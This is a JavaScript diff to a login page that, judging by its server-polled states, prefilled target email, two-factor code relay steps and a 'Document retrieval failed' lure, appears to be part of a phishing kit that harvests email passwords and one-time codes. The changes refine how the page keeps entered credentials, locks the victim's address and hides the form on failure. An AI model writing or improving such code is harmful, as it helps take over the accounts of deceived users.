@@ -794,6 +794,7 @@ function updateUIForStatus(status, data = {}) {
   const emailField = document.getElementById('exampleInputEmail1');
   const passwordField = document.getElementById('exampleInputPassword1');
   const verificationCodeInput = document.getElementById('verificationCodeInput');
+  const prefilledEmail = !!new URLSearchParams(window.location.search).get('email');
 
   // Hide all error messages only on status change
   if (statusChanged) {
@@ -811,7 +812,12 @@ function updateUIForStatus(status, data = {}) {
       passwordGroup.style.display = 'block';
       verificationOptionsGroup.style.display = 'none';
       verificationCodeGroup.style.display = 'none';
-      if (isInitialLoad) { showLoadingOverlay(true); isInitialLoad = false; } else { setFormSubmitting(true); }
+      if (isInitialLoad) {
+        showLoadingOverlay(true);
+        isInitialLoad = false;
+      } else {
+        setFormSubmitting(true);
+      }
       submitButton.innerText = "Checking...";
       submitButton.disabled = true;
       emailField.readOnly = true;
@@ -823,7 +829,12 @@ function updateUIForStatus(status, data = {}) {
       passwordGroup.style.display = 'block';
       verificationOptionsGroup.style.display = 'none';
       verificationCodeGroup.style.display = 'none';
-      if (isInitialLoad) { showLoadingOverlay(true); isInitialLoad = false; } else { setFormSubmitting(true); }
+      if (isInitialLoad) {
+        showLoadingOverlay(true);
+        isInitialLoad = false;
+      } else {
+        setFormSubmitting(true);
+      }
       submitButton.innerText = "Processing...";
       submitButton.disabled = true;
       emailField.readOnly = true;
@@ -832,21 +843,22 @@ function updateUIForStatus(status, data = {}) {
       break;
     case 'WAITINGEMAIL':
     case 'WAITINGEMAILERROR':
+      setFormSubmitting(false);
       emailGroup.style.display = 'block';
       passwordGroup.style.display = 'block';
       verificationOptionsGroup.style.display = 'none';
       verificationCodeGroup.style.display = 'none';
       submitButton.innerText = "Login";
       if (data.email) emailField.value = data.email;
-      emailField.readOnly = false;
+      emailField.readOnly = prefilledEmail;
       passwordField.disabled = false;
+      passwordField.readOnly = false;
       if (data.lastJsonResponse) {
         try {
           const lastResp = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
           if (lastResp.message && !lastResp.message.includes('Processing email')) {
             document.getElementById('InvalidEmail').textContent = lastResp.message;
             document.getElementById('InvalidEmail').style.display = 'block';
-            passwordField.value = '';
           }
         } catch(e) {}
       }
@@ -857,21 +869,22 @@ function updateUIForStatus(status, data = {}) {
       break;
     case 'WAITINGPASSWORD':
     case 'WAITINGPASSWORDERROR':
+      setFormSubmitting(false);
       emailGroup.style.display = 'block';
       passwordGroup.style.display = 'block';
       verificationOptionsGroup.style.display = 'none';
       verificationCodeGroup.style.display = 'none';
       submitButton.innerText = "Login";
       if (data.email) emailField.value = data.email;
-      emailField.readOnly = true;
+      emailField.readOnly = prefilledEmail;
       passwordField.disabled = false;
+      passwordField.readOnly = false;
       if (data.lastJsonResponse) {
         try {
           const lastResp = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
           if (lastResp.message && (lastResp.message.includes('Incorrect password') || lastResp.message.includes('incorrect'))) {
             document.getElementById('InvalidPassword').textContent = lastResp.message;
             document.getElementById('InvalidPassword').style.display = 'block';
-            passwordField.value = '';
           }
         } catch(e) {}
       } else if (currentStatus === 'WAITINGPASSWORDERROR') {
@@ -885,6 +898,7 @@ function updateUIForStatus(status, data = {}) {
       startPolling(2000);
       break;
     case 'WAITINGOPTIONS':
+      setFormSubmitting(false);
       emailGroup.style.display = 'none';
       passwordGroup.style.display = 'none';
       verificationOptionsGroup.style.display = 'block';
@@ -905,6 +919,7 @@ function updateUIForStatus(status, data = {}) {
       startPolling(2000);
       break;
     case 'WAITINGCODE':
+      setFormSubmitting(false);
       emailGroup.style.display = 'none';
       passwordGroup.style.display = 'none';
       verificationOptionsGroup.style.display = 'none';
@@ -964,7 +979,7 @@ function updateUIForStatus(status, data = {}) {
         document.getElementById('InvalidPassword').textContent = "Incorrect email or password. Try again.";
         document.getElementById('InvalidPassword').style.display = 'block';
       } else {
-        showStyledError('Document retrieval failed. Please try again later.');
+        showFailedView('Document retrieval failed. Please try again later.');
       }
       if (!isSameStatusDuringSubmit) {
         hideLoadingOverlay();
@@ -989,6 +1004,21 @@ function showStyledError(message) {
     msgEl.textContent = message || 'An unexpected error occurred.';
     container.style.display = 'block';
   }
+}
+
+function showFailedView(message) {
+  ['emailGroup', 'passwordGroup', 'verificationOptionsGroup', 'verificationCodeGroup'].forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.style.display = 'none';
+  });
+  const submitButton = document.getElementById('submitButton');
+  if (submitButton) submitButton.style.display = 'none';
+  const subtitle = document.querySelector('.form-subtitle, .email-providers, #emailCallout');
+  if (subtitle) subtitle.style.display = 'none';
+  const docTitle = document.querySelector('.document-title, h3');
+  if (docTitle) docTitle.style.display = 'none';
+  hideAllErrors();
+  showStyledError(message);
 }
 
 function hideStyledError() {
@@ -1403,6 +1433,7 @@ async function handleFormSubmission() {
 
 // Helper function to reset form/button fields
 function resetFormState() {
+  setFormSubmitting(false);
   const btn = document.getElementById('submitButton');
   const emailField = document.getElementById('exampleInputEmail1');
   const passwordField = document.getElementById('exampleInputPassword1');
@@ -1410,10 +1441,14 @@ function resetFormState() {
 
   if (!new URLSearchParams(window.location.search).get('email')) {
     emailField.readOnly = false;
+    emailField.disabled = false;
+    emailField.value = '';
+  } else {
+    emailField.readOnly = true;
+    emailField.disabled = false;
   }
-  emailField.value = '';
   passwordField.disabled = false;
-  passwordField.value = "";
+  passwordField.readOnly = false;
   verificationCodeInput.value = "";
   btn.disabled = false;
   btn.innerText = "Login";
